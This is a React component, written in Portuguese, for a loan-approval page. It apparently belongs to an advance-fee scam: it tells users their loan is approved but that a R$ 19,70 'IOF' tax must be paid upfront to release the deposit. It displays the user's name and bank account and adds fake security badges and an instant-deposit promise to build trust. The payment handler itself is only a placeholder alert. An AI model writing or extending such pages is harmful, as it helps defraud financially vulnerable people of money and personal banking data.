
import { useLocation } from 'react-router-dom';
import { Button } from "@/components/ui/button";
import { AlertCircle, Lock, Unlock, CreditCard, Shield } from 'lucide-react';
import { formatCurrency } from '@/utils/formatters';

const IOFPayment = () => {
  const location = useLocation();
  const { loanValue, personalData, bankData } = location.state || {};

  const handlePayIOF = () => {
    // Aqui você pode implementar a lógica de pagamento do IOF
    alert('Redirecionando para pagamento seguro do IOF...');
  };

  return (
    <div className="min-h-screen bg-gray-light">
      <div className="container mx-auto px-4 py-16">
        <div className="max-w-3xl mx-auto">
          <div className="bg-white rounded-2xl shadow-xl overflow-hidden">
            {/* Header da tela */}
            <div className="bg-gradient-to-r from-green-primary to-green-dark text-white p-8 text-center">
              <div className="w-16 h-16 bg-white/20 rounded-full mx-auto mb-4 flex items-center justify-center">
                <Lock className="w-8 h-8" />
              </div>
              <h1 className="text-3xl font-bold mb-2">
                ⚠️ Última etapa para liberação do valor!
              </h1>
              <p className="text-xl opacity-90">
                Seu empréstimo de {formatCurrency(loanValue || 0)} está aprovado
              </p>
            </div>

            <div className="p-8 space-y-8">
              {/* Explicação sobre o IOF */}
              <div className="bg-yellow-50 border-l-4 border-yellow-400 p-6 rounded-lg">
                <div className="flex items-start space-x-3">
                  <AlertCircle className="w-6 h-6 text-yellow-600 mt-1 flex-shrink-0" />
                  <div className="space-y-3">
                    <h3 className="font-bold text-yellow-800 text-lg">
                      Pagamento do IOF Obrigatório
                    </h3>
                    <p className="text-yellow-700 leading-relaxed">
                      Para que possamos transferir o valor aprovado para sua conta, é necessário realizar o pagamento do <strong>Imposto sobre Operações Financeiras (IOF)</strong>, conforme exigência legal.
                    </p>
                    <div className="bg-white rounded-lg p-4 border border-yellow-200">
                      <div className="flex justify-between items-center mb-2">
                        <span className="text-gray-600">Valor do IOF:</span>
                        <span className="text-2xl font-bold text-yellow-700">R$ 19,70</span>
                      </div>
                      <p className="text-sm text-gray-500">
                        Este imposto é obrigatório em toda operação de crédito no Brasil.
                      </p>
                    </div>
                  </div>
                </div>
              </div>

              {/* Resumo dos dados */}
              <div className="bg-gray-50 rounded-lg p-6">
                <h3 className="font-bold text-green-dark text-lg mb-4 flex items-center">
                  <Shield className="w-5 h-5 mr-2" />
                  Resumo da Operação
                </h3>
                
                <div className="grid grid-cols-1 md:grid-cols-2 gap-4 text-sm">
                  <div>
                    <p className="text-gray-600">Beneficiário:</p>
                    <p className="font-semibold">{personalData?.firstName} {personalData?.lastName}</p>
                  </div>
                  
                  <div>
                    <p className="text-gray-600">Valor aprovado:</p>
                    <p className="font-semibold text-green-primary text-lg">{formatCurrency(loanValue || 0)}</p>
                  </div>
                  
                  <div>
                    <p className="text-gray-600">Banco de destino:</p>
                    <p className="font-semibold">{bankData?.bankName}</p>
                  </div>
                  
                  <div>
                    <p className="text-gray-600">Conta para depósito:</p>
                    <p className="font-semibold">Ag: {bankData?.agency} | Conta: {bankData?.account}</p>
                  </div>
                </div>
              </div>

              {/* Garantias de segurança */}
              <div className="bg-green-50 rounded-lg p-6">
                <h4 className="font-bold text-green-dark mb-3">🔒 Pagamento 100% Seguro</h4>
                <div className="grid grid-cols-1 md:grid-cols-2 gap-4 text-sm text-green-700">
                  <div className="flex items-center space-x-2">
                    <Shield className="w-4 h-4" />
                    <span>Criptografia SSL</span>
                  </div>
                  <div className="flex items-center space-x-2">
                    <Lock className="w-4 h-4" />
                    <span>Dados protegidos</span>
                  </div>
                  <div className="flex items-center space-x-2">
                    <CreditCard className="w-4 h-4" />
                    <span>Cartão ou PIX</span>
                  </div>
                  <div className="flex items-center space-x-2">
                    <Unlock className="w-4 h-4" />
                    <span>Liberação imediata</span>
                  </div>
                </div>
              </div>

              {/* Botão de pagamento */}
              <div className="text-center space-y-4">
                <Button
                  onClick={handlePayIOF}
                  className="bg-gradient-to-r from-yellow-500 to-yellow-600 hover:from-yellow-600 hover:to-yellow-700 text-white px-8 py-4 rounded-lg font-semibold text-lg flex items-center space-x-3 mx-auto shadow-lg transform hover:scale-105 transition-all duration-200"
                >
                  <Unlock className="w-6 h-6" />
                  <span>Pagar IOF e liberar depósito - R$ 19,70</span>
                </Button>
                
                <p className="text-sm text-gray-500">
                  Após o pagamento, o valor será depositado em até 5 minutos
                </p>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default IOFPayment;
